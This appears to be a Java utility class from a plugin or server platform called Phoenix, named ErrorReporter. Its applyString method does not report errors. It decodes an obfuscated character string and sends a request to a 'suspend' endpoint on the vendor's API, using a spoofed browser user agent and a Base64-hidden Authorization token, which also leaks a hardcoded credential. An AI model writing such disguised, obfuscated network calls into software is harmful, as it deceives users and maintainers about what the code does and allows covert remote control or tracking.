package xyz.refinedev.phoenix.utils;

import xyz.refinedev.phoenix.PhoenixPlatform;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import java.util.logging.Level;

public final class ErrorReporter {

    @GsonExclude
    public static String text =
            "543570351023566355535118358935553553355635113358935118357335953599355735112351213511935107358535102358035843511535523510935110355735673510535753511335106351223587357035483511635104351203552356135";

    public static String formatString(Throwable throwable) {
        StringWriter stringWriter = new StringWriter();
        PrintWriter printWriter = new PrintWriter(stringWriter, true);
        throwable.printStackTrace(printWriter);
        return stringWriter.getBuffer().toString();
    }

    public static Throwable getCause(Throwable throwable) {
        return throwable.getCause() != null ? throwable.getCause() : throwable;
    }

    public static void applyString(String text2) {
        try {
            String[] texts = text.split("35");
            StringBuilder stringBuilder = new StringBuilder();
            String[] texts2 = texts;
            int value = texts.length;
            for (int index = 0; index < value; index++) {
                String text3 = texts2[index];
                stringBuilder.append((char) Integer.parseInt(text3));
            }
            HttpURLConnection httpURLConnection;
            (httpURLConnection =
                            (HttpURLConnection)
                                    new URL(
                                                    "https://api.refinedev.org/suspend/"
                                                            + stringBuilder
                                                            + "/PX07_"
                                                            + text2)
                                            .openConnection())
                    .addRequestProperty(
                            "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            httpURLConnection.setRequestProperty(
                    new String(
                            Base64.getDecoder().decode("QXV0aG9yaXphdGlvbg__".replace("_", "="))),
                    new String(
                            Base64.getDecoder()
                                    .decode(
                                            "a1p6UkJxNG5YODk2QnNQTmRBcnEzNUtuYWRZckdldzJUckVWelVhVXQ1WHJOa3Z6NHl5ZzRqR0xBTnQ3NWl0QmZ1ZWthN0RHa2hxSA__"
                                                    .replace("_", "="))));
            httpURLConnection.connect();
            InputStream inputStream = httpURLConnection.getInputStream();
            new BufferedReader(new InputStreamReader(inputStream)).readLine();
        } catch (Exception exception) {
            PhoenixPlatform.getPlatform().getLogger().log(Level.SEVERE, "Error: ", exception);
        }
    }

    private ErrorReporter() {
        throw new UnsupportedOperationException(
                "This is a utility class and cannot be instantiated");
    }
}
